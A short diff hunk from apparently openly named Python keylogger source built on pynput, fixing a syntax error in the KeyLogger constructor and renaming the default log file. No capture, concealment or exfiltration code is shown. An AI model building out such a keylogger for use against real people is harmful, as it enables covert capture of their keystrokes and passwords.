@@ -2,7 +2,7 @@ from pynput import keyboard
 import os
 
 class KeyLogger():
-    def __init__(self, filename: str = "logs.txt" -> None:
+    def __init__(self, filename: str = "log.txt") -> None:
         self.filename = filename
 
     @staticmethod
